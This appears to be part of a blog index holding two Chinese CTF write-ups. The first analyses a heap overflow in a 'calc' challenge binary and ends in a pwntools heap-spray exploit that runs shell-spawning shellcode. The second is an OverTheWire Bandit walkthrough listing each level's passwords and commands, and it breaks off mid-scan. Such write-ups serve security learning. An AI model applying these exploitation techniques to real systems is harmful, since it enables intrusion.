这个函数中申请了0x84大小的堆空间，并返回。因此dword_804D0B4，dword_804D0AC分别指向大小为0x84的堆。\n\n![](image-20200626202214785.png)\n\n### line 4 5 6 7\n\n这四行以及之后的许多行都是在重复4 5行的函数，因此分析完前两个就能推断之后的操作。\n\n先看4 5 行，涉及两个函数sub_804A83F()和sub_804A946()，以及一个函数指针sub_80494AA和一个bss段的变量dword_804D0B0。接下来重点分析这两个函数。\n\n```c\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n```\n\n#### sub_804A83F()\n\n函数定义如下：\n\n```c\n_DWORD *__cdecl sub_804A83F(char *s, int a2)\n{\n  _DWORD *v2; // ST1C_4\n\n  v2 = calloc(0x10u, 1u);\n  *v2 = strdup(s);\n  v2[2] = a2;\n  v2[1] = \"function\";\n  v2[3] = 0;\n  return v2;\n}\n```\n\n输入为一个字符串和一个整型值（函数指针的地址）。函数内先申请一个大小为0x10的堆空间（*v2指向该堆空间），然后将输入的字符串地址（strdup申请了一个堆空间用来存放字符串）放在v2[0]；v2[1]处存放字符串\"function\"的地址，标志这是一个function堆；将传入的函数指针地址放在v2[2]；v2[3]置空。最后将该堆块返回给上一层调用者。\n\n```\nv2堆块如下。以第4行为例，heap1中存放着字符串“add”；string1处的字符串为“function”；function1是一个处理add逻辑的函数。\n|------------|\n| &heap1     |\n|------------|\n| &string1   |\n|------------|\n| &function1 |\n|------------|\n| 0          |\n|------------|\n```\n\n#### sub_804A946()\n\n以add为例，该函数的参数分别为dword_804D0B0（bss段的一个值，为一个堆块地址）， \"add\"字符串,，以及上一个函数sub_804A83F()的返回值（一个0x10大小的堆块）。sub_804A946()函数定义如下，我在函数中标记了注释。\n\n```c\nint __cdecl sub_804A946(int a1, char *s, int a3)\n{\n  int result; // eax\n  size_t i; // [esp+4h] [ebp-14h]\n  int v5; // [esp+8h] [ebp-10h]\n  signed int v6; // [esp+Ch] [ebp-Ch]\n/*检查dword_804D0B0堆块第一个字节指向的堆块是否为空。如果是空，就申请一个大小为0x10的堆，并在该堆块偏移8字节处写入字符‘a’；如果非空，则跳过执行下面的部分。*/\n  if ( !*a1 )\t\n  {\n    *a1 = calloc(0x10u, 1u);\n    *(*a1 + 8) = *s;\n  }\n/*v5赋值dword_804D0B0堆块第一个字节指向的堆块地址（即*a1），v6赋值传入字符串s的长度。*/\n  v5 = *a1;\n  v6 = strlen(s);\n/*进入for循环处理字符串s*/\n  for ( i = 0; i <= v6; ++i )\n  {\n/*1、判断dword_804D0B0堆块指向的堆块偏移4字节的位置是否不为空；2、判断dword_804D0B0堆块指向的堆块地址偏移8字节处是否跟字符串的第i个字符不相等。两个同时满足时执行v5 = *(v5 + 4)；其中一个不满足则跳过该操作，继续执行后续部分。*/\n    while ( *(v5 + 4) && *(v5 + 8) != s[i] )\n      v5 = *(v5 + 4);\n/*如果此时v5堆块偏移8字节的位置跟s[i]的值不相等，则进入if语句中处理；如果两者相等，则复用该堆块，继续处理下一个字符。*/\n    if ( *(v5 + 8) != s[i] )\n    {\n/*新申请一个0x10大小的堆块，并将堆块地址写到v5堆块偏移4字节的位置。然后将s[i]写到新申请的堆块偏移8字节的位置。然后让v5指向新申请的堆块。*/\n      *(v5 + 4) = calloc(0x10u, 1u);\n      *(*(v5 + 4) + 8) = s[i];\n      v5 = *(v5 + 4);\n/**/\n      while ( strlen(s) > i )\n      {\n        *v5 = calloc(0x10u, 1u);\n        *(*v5 + 8) = s[++i];\n        v5 = *v5;\n      }\n      break;\n    }\n/*如果s[i]为空，即到了字符串的结束位置，则结束循环。*/\n    if ( !s[i] )\n      break;\n/*如果*v5为空，新申请一个0x10大小的堆块，并让*v5指向该对堆块。然后将s[i+1]处的字符写到新申请堆块偏移8字节的位置。*/\n    if ( !*v5 )\n    {\n      *v5 = calloc(0x10u, 1u);\n      *(*v5 + 8) = s[i + 1];\n    }\n/*让v5指向*v5指向的堆块*/\n    v5 = *v5;\n  }\n/*上述循环将所有的字符全部处理完毕后，将v5当前指向堆块的地址给result*/\n  result = v5;\n/*将a3（即sub_804A83F()返回的堆块）的地址写到v5堆块内偏移12字节的位置*/\n  *(v5 + 12) = a3;\n  return result;\n}\n```\n\n执行完4 5 6 7行后，会形成如下图所示的堆空间关系：\n\n![](image-20200626232425175.png)\n\n### line 8 \n\n这个while循环内会对输入进行处理，是跟外部数据交互的窗口，因此漏洞极有可能存在于循环内部的处理过程。\n\n### line 9\n\n这一行通过fgets从标准输入（即键盘）中获取输入字符串。根据fgets的特性，本题中它最多接受`256-1=255`个字符输入。s在栈上的空间为0x100=256，加上字符串结束符'\\x00'也不会溢出。\n\n> **char \\*fgets(char \\*str, int n, FILE \\*stream)** 从指定的流 stream 读取一行，并把它存储在 **str** 所指向的字符串内。当读取 **(n-1)** 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止。\n\n### line 10\n\n这一行及后两行的目的是对输入字符串进行处理。寻找输入字符串最后一次出现'\\n'的位置，即字符串结束的位置，并往该位置写0x00（是ASCII码的0，而不是字符 '0'。）\n\n### line11\n\n第11行是函数sub_8048BC1(&s)，处理输入的字符串s。使用strtok将字符串s进行分解。\n\n> char *strtok(char *str, const char *delim) 分解字符串 str 为一组字符串，delim 为分隔符。\n\n这个函数中，有三个大的处理逻辑：\n\n- while ( s1 )：对传入字符串分解得到的运算数和运算符进行解析，并将运算数链接到bss段的dword_804D0B4，将运算符链接到bss段的dword_804D0AC。\n- while ( !sub_804A8D7(dword_804D0AC) )：判断dword_804D0AC指向堆空间的第一个值是否为0（第一个值代表运算符个数），即判断是否存在运算符。\n- if ( !result )\n\n#### while(s1)\n\n如下对运算数的处理中存在漏洞函数。重点看a和b两段指令。\n\n```c\n    if ( (*__ctype_b_loc())[*s1] & 0x800 || *s1 == '-' && strlen(s1) > 1 )\n    {\n      if ( sub_804886B(s1) )\n      {\n        v1 = sub_804A6F8(byte_804AC65, s1);\t\t//a\n        sub_804A8B5(dword_804D0B4, v1);\t\t\t//b\n      }\n      else\n      {\n        puts(\"invalid number\");\n      }\n      goto LABEL_68;\n    }\n```\n\n- a - sub_804A6F8函数\n\n  ```c\n  _DWORD *__cdecl sub_804A6F8(char *s, char *nptr)\n  {\n    _DWORD *v2; // ST1C_4\n  \n    v2 = calloc(0x10u, 1u);\n    v2[2] = strtol(nptr, 0, 10);\n    v2[1] = \"int\";\n    *v2 = strdup(s);\n    v2[3] = strlen(nptr);\n    return v2;\n  }\n  ```\n\n  可以看到，该函数中生成了如下堆块，并返回给上层调用者。\n\n  ```\n  heap1中存放着函数的第一个参数；string1处的字符串为“int”；num是运算数的十进制表达式；最后一个块中存放运算数的长度信息。\n  |------------|\n  | &heap1     |\n  |------------|\n  | &string1   |\n  |------------|\n  | num        |\n  |------------|\n  | strlen(num)|\n  |------------|\n  ```\n\n  \n\n- b - sub_804A8B5函数\n\n  ```c\n  _DWORD *__cdecl sub_804A8B5(_DWORD *a1, int a2)\n  {\t\t\n    _DWORD *result; // eax\n  \n    ++*a1;\n    result = a1;\n    a1[*a1 + 1] = a2;\n    return result;\n  }\n  ```\n\n  该函数的入参为：a1是dword_804D0B4（即指向0x84大小的堆块），a2是sub_804A6F8函数返回的堆块地址。函数的功能是操作0x84堆块中的内容，将堆中第一块（4字节）的内容自加1（作为计数，记录堆块中链接了多少个操作数），并从第3个块（a1[2]）处链接操作数堆块a2。\n\n对运算符的处理过程跟以上对运算数的处理过程基本一致，只不过运算符是链接在dword_804D0AC指向的堆块上。\n\n由于dword_804D0B4指向的堆块先于dword_804D0AC指向堆块的申请，因此他俩在堆空间的排布如下：\n\n![](image-20200627001525800.png)\n\ndword_804D0B4指向的堆块大小为0x84，最多可存储0x84/0x4 - 2=0x21 - 2=33 - 2 = 31个运算数信息。但是我们可以输入256个字节的字符串，因此我们可输入的运算数远远大于31，那么此时运算数信息就会溢出到存放运算符的堆块。如上图所示，第33个运算数的堆块会覆盖绿色堆块中的count，那么之后访问运算符的时候会取到一个超大的值。\n\n#### while ( !sub_804A8D7(dword_804D0AC) )\n\n```c\n    v9 = sub_804A88E(dword_804D0AC);\n    (*(v9 + 8))();\n```\n\n先调用sub_804A88E函数，从运算符堆块中取出一个运算符，然后对该运算符取值运行。\n\n```c\nint __cdecl sub_804A88E(_DWORD *a1)\n{\n  return a1[(*a1)-- + 1];\n}\n```\n\n我们可以看到sub_804A88E中访问了运算符堆块的第一个count，即*a1。上面讨论了这个值可以被越界覆盖，因此在这里会越界访问，导致程序崩溃。\n\n## 1.4 poc\n\n```shell\n$ python -c \"print '1 ' * 33\"\n1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n$ gdb calc\ngef➤  r\nStarting program: /mnt/hgfs/VMshare/calc/calc \n> 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804a89c in ?? ()\n[ Legend: Modified register | Code | Heap | Stack | String ]\n─────────────────────────────────────────────────────────────────── registers ────\n$eax   : 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x0804f058  →  0x0804f070  →  0x00000000\n$esp   : 0xffffcd08  →  0x00000000\n$ebp   : 0xffffcd18  →  0xffffcd78  →  0xffffcea8  →  0x00000000\n$esi   : 0xf7fb6000  →  0x001b1db0\n$edi   : 0xf7fb6000  →  0x001b1db0\n$eip   : 0x0804a89c  →   mov eax, DWORD PTR [eax+edx*4+0x4]\n$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\n$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 \n────────────────────────────────────────────────────────────────────────── stack ────\n0xffffcd08│+0x0000: 0x00000000\t ← $esp\n0xffffcd0c│+0x0004: 0x00000000\n0xffffcd10│+0x0008: 0x00000000\n0xffffcd14│+0x000c: 0x00000000\n0xffffcd18│+0x0010: 0xffffcd78  →  0xffffcea8  →  0x00000000\t ← $ebp\n0xffffcd1c│+0x0014: 0x080493b6  →   add esp, 0x10\n0xffffcd20│+0x0018: 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000\n0xffffcd24│+0x001c: 0x0804ac54  →   and BYTE PTR [eax], al\n───────────────────────────────────────────────────────────────────────── code:x86:32 ────\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n    0x804a8a8                  lea    edx, [eax-0x1]\n    0x804a8ab                  mov    eax, DWORD PTR [ebp+0x8]\n────────────────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, Name: \"calc\", stopped, reason: SIGSEGV\n──────────────────────────────────────────────────────────────────────── trace ────\n[#0] 0x804a89c → mov eax, DWORD PTR [eax+edx*4+0x4]\n[#1] 0x80493b6 → add esp, 0x10\n[#2] 0x8048bb9 → add esp, 0x10\n[#3] 0xf7e1c637 → __libc_start_main(main=0x80488cb, argc=0x1, argv=0xffffcf54, init=0x804aba0, fini=0x804ac00, rtld_fini=0xf7fe8880 <_dl_fini>, stack_end=0xffffcf4c)\n[#4] 0x8048791 → hlt \n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x0804e000 0x0806f000 0x00000000 rwx [heap]\n0xf7e03000 0xf7e04000 0x00000000 rwx \n0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb4000 0xf7fb6000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb6000 0xf7fb7000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb7000 0xf7fba000 0x00000000 rwx \n0xf7fd3000 0xf7fd4000 0x00000000 rwx \n0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\ngef➤  \n```\n\n可以看到，程序运行到`0x804a89c   mov    eax, DWORD PTR [eax+edx*4+0x4]`处时，崩溃了。`eax+edx*4+0x4 = 0x0804e0a8 +0x0804f058*4 + 0x4 = 0x2818a20c`。通过上面的vmmap信息，可以看出，0x2818a20c这个地址并未被映射，所以访问时会导致程序异常崩溃。\n\n我们要怎样利用这个异常访问呢？如果我们能将这个超大地址映射成功，并且能控制这个地址的内容，是不是就能控制执行流了呢？\n\n这个题没有开NX，因此堆栈上的数据可以执行，我们可以在堆上布局shellcode。\n\n# 2 利用\n\n## 2.1 申请不释放的堆空间\n\n我们发现乘法函数sub_8049A0E中有一段申请内存的操作，但是并没有释放这些内存。因此我们可以利用该乘法函数，不断扩展堆空间，使0x2818a20c这个位置被映射。\n\n如下代码段是sub_8049A0E函数中涉及内存申请的部分。当一个字符类型和一个整形相乘时，会根据字符长度和整型值的乘积申请堆空间。`*(v8 + 12)` 是字符的长度，`*(v7 + 8)`是整型值。\n\n```c\n       else if ( !strcmp(*(v8 + 4), \"str\") && !strcmp(*(v7 + 4), \"int\") )\n        {\n          v6 = *(v7 + 8);\n          dest = calloc(*(v8 + 12) * *(v7 + 8) + 1, 1u);\n          v9 = dest;\n```\n\n因此用如下poc测试申请堆空间，确认能否将较高地址处映射成功。\n\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\npayload = '\"a \" * 100000'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\n执行结果如下，可见0x09779000至0x510e2000的地址空间全被映射为堆空间了，并且被我们的输入\"a \"给填满了。\n\n```shell\n───────────────────────────────────────────────────────────────── registers ────\n$eax   : 0x097790a8  →  0x510c22d8  →  0x510c22f0  →  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x510c22d8  →  0x510c22f0  →  0x00000000\n\n─────────────────────────────────────────────────────────────── code:x86:32 ────\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x09779000 0x510e2000 0x00000000 rwx [heap]\n0xf7dad000 0xf7dae000 0x00000000 rwx \n0xf7dae000 0xf7f5e000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f5e000 0xf7f60000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f60000 0xf7f61000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7f61000 0xf7f64000 0x00000000 rwx \n0xf7f7d000 0xf7f7e000 0x00000000 rwx \n0xf7f7e000 0xf7f81000 0x00000000 r-- [vvar]\n0xf7f81000 0xf7f83000 0x00000000 r-x [vdso]\n0xf7f83000 0xf7fa6000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa6000 0xf7fa7000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa7000 0xf7fa8000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffd0000 0xffff1000 0x00000000 rwx [stack]\n\ngef➤  x/10gx 0x33333333\n0x33333333:\t0x6161616161616161\t0x6161616161616161\n0x33333343:\t0x6161616161616161\t0x6161616161616161\n0x33333353:\t0x6161616161616161\t0x6161616161616161\n0x33333363:\t0x6161616161616161\t0x6161616161616161\n0x33333373:\t0x6161616161616161\t0x6161616161616161\n```\n\n此时eax+edx*4+0x4的计算如下：\n\n```shell\n>>> eax = 0x097790a8\n>>> edx = 0x510c22d8\n>>> hex(eax+edx*4+0x4)\n'0x14da81c0c'\n```\n\n由于环境是32位的，所以最终计算结果为'0x4da81c0c'，这个值是sub_804A88E函数的返回值。这个返回值作为地址，偏移8字节的位置处的值，会被作为函数执行。如果我们能劫持0x4da81c0c+8=0x4da81c14地址处的值，就可以劫持控制流。\n\n```c\n    v9 = sub_804A88E((_DWORD *)G_D0AC);\n    (*(void (**)(void))(v9 + 8))();\n```\n\n## 2.2 exp\n\n通过以上的分析可知，我们需要往堆空间布局一些shellcode，并且劫持`(*(void (**)(void))(v9 + 8))()`执行我们的shellcode。但是我们很难精确将shellcode布置到该地址，因此采用'\\x0c'滑板指令，结合shellcode的方式完成利用。\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\n#payload = '\"a\" * 100000'\npayload = '\"' + asm(shellcraft.sh()).ljust(200,'\\x0c') + '\" * 500'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```","categories":["CTF"]},{"title":"overthewire bandit","url":"/2020/05/17/overthewire-bandit/","content":"\n# 1 题目链接\n\n[https://overthewire.org/wargames/bandit/](https://overthewire.org/wargames/bandit/)\n\n# 2 解题过程\n\n(0)\n\nbandit.labs.overthewire.org, on port 2220\n\n(1)\n\nssh bandit1@bandit.labs.overthewire.org -p 2220\n\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n(2)\n\nssh bandit2@bandit.labs.overthewire.org -p 2220\n\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n`cat \"spaces in this filename\"`\n`cat spaces\\ in\\ this\\ filename`\n\n(3)\n\nssh bandit3@bandit.labs.overthewire.org -p 2220\n\nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n(4)\n\nssh bandit4@bandit.labs.overthewire.org -p 2220\n\npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n\n```\nbandit4@bandit:~/inhere$ file ./-file*\n./-file00: data\n./-file01: data\n./-file02: data\n./-file03: data\n./-file04: data\n./-file05: data\n./-file06: data\n./-file07: ASCII text\n./-file08: data\n./-file09: data\nbandit4@bandit:~/inhere$ cat ./-file07\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n```\n(5)\n\nssh bandit5@bandit.labs.overthewire.org -p 2220\n\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n```\nfind ./ -type f -size 1033c\n```\n\n(6)\n\nssh bandit6@bandit.labs.overthewire.org -p 2220\n\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n\n```\nfind ./ -size 33c -user bandit7 -group bandit6\ncat ./var/lib/dpkg/info/bandit7.password\n```\n\n\n\n(7)\n\nssh bandit7@bandit.labs.overthewire.org -p 2220\n\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n```\ngrep -ri millionth\n```\n\n\n\n(8)\n\nssh bandit8@bandit.labs.overthewire.org -p 2220\n\ncvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n```\nsort ./data.txt | uniq -u\n```\n\n\n\n(9)\n\nssh bandit9@bandit.labs.overthewire.org -p 2220\n\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\n```\nstrings ./data.txt | grep ====\n```\n\n\n\n(10)\n\nssh bandit10@bandit.labs.overthewire.org -p 2220\n\ntruKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n```\nbandit10@bandit:~$ base64 -d data.txt \nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n```\n\n(11)\n\nssh bandit11@bandit.labs.overthewire.org -p 2220\n\nIFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n```\nbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\nThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n```\n\n(12)\n\nssh bandit12@bandit.labs.overthewire.org -p 2220\n\n5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n```shell\n    7  mkdir /tmp/bling\n    8  cp data.txt /tmp/bling\n    9  cd /tmp/bling\n   13  xxd -r data.txt data.bin\n   18  file data.bin\n   19  mv data.bin data.gz\n   20  gzip -d data.gz\n   22  file data\n   23  bzip2 -d data\n   25  file data.out\n   26  mv data.out data.gz\n   28  gzip -d data.gz\n   30  file data\n   31  tar -xvf data\n   33  file data5.bin\n   35  tar -xvf data5.bin\n   36  file data6.bin\n   37  bzip2 -d data6.bin\n   39  file data6.bin.out\n   40  tar -xvf data6.bin.out\n   45  file data8.bin\n   46  mv data8.bin data8.gz\n   48  gzip -d data8.gz\n   50  file data8\n   51  cat data8\n```\n\n(13)\n\nssh bandit13@bandit.labs.overthewire.org -p 2220\n\n8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n```\nssh bandit14@localhost -i sshkey.private\ncat  /etc/bandit_pass/bandit14\n```\n\n(14)\n\nssh bandit14@bandit.labs.overthewire.org -p 2220\n\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n```shell\nbandit14@bandit:~$ nc localhost 30000\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n```\n\n(15)\n\nssh bandit15@bandit.labs.overthewire.org -p 2220\n\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n\n```shell\nbandit15@bandit:~$ openssl s_client -connect localhost:30001\nCONNECTED(00000003)\ndepth=0 CN = localhost\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = localhost\nverify return:1\n---\nCertificate chain\n 0 s:/CN=localhost\n   i:/CN=localhost\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls\nb2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD\nVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR\nFEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS\n+puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e\npkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC\nCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0\nZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3\nDQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw\nrq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q\nPfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn\n-----END CERTIFICATE-----\nsubject=/CN=localhost\nissuer=/CN=localhost\n---\nNo client certificate CA names sent\nPeer signing digest: SHA512\nServer Temp Key: X25519, 253 bits\n---\nSSL handshake has read 1019 bytes and written 269 bytes\nVerification error: self signed certificate\n---\nNew, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384\nServer public key is 1024 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nNo ALPN negotiated\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n    Session-ID: 007E0D8A0128B2FF4D905508CF737C9AA328D4D7EC300F3670BF87BF48F448AB\n    Session-ID-ctx: \n    Master-Key: 0943896BA02534F6AD45C9F4FD218941160F569022FD88ADD3C91E5555A65B4E56FBAC7628F26A5703404039B9AF6C4D\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.\n    0010 - 2b 8e 00 de ab bf a4 f4-12 a3 29 78 f8 c9 c1 86   +.........)x....\n    0020 - ff 7e ea db 76 0f 6c b8-45 ee 4c bd 2e 81 3f ff   .~..v.l.E.L...?.\n    0030 - 81 ff c9 0d 2b 14 fe c9-28 84 1d 41 80 47 9f 9b   ....+...(..A.G..\n    0040 - b6 72 e4 9e d1 80 c6 9c-d6 05 8c 58 31 b2 14 f3   .r.........X1...\n    0050 - b5 ca 94 a9 02 01 7e b7-6d a1 7d 6d fb 07 9f b5   ......~.m.}m....\n    0060 - 41 25 06 59 eb 61 d3 62-16 d3 69 35 5a b1 49 07   A%.Y.a.b..i5Z.I.\n    0070 - 53 3f 04 5f f2 b7 e7 45-34 56 82 f5 6e 2e fe 0d   S?._...E4V..n...\n    0080 - a9 cd a6 d5 ff 90 89 b1-a6 4c 82 8b 8b b8 a8 15   .........L......\n    0090 - 95 6e d9 9f 0b bb 4a 9e-e2 01 60 c0 9c 44 a3 6a   .n....J...`..D.j\n\n    Start Time: 1589699552\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: yes\n---\nBfMYroe26WYalil77FoDi9qh59eK5xNr\nCorrect!\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\nclosed\n```\n\n\n\n(16)\n\nssh bandit16@bandit.labs.overthewire.org -p 2220\n\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\n```shell\nbandit16@bandit:~$ nmap -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:18 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00028s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n-------------------------------------------------------------------------------\nbandit16@bandit:~$ nmap -sV -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:34 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00025s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE     VERSION\n31046/tcp open  echo\n31518/tcp open  ssl/echo\n31691/tcp open  echo\n31790/tcp open  ssl/unknown\n31960/tcp open  echo\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31790-TCP:V=7.40%T=SSL%I=7%D=5/17%Time=5EC0E90B%P=x86_64-pc-linux-g\nSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu\nSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea\nSF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,\nSF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\\nSF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x\nSF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20\nSF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20Please\nSF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"W\nSF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r\nSF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20c\nSF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!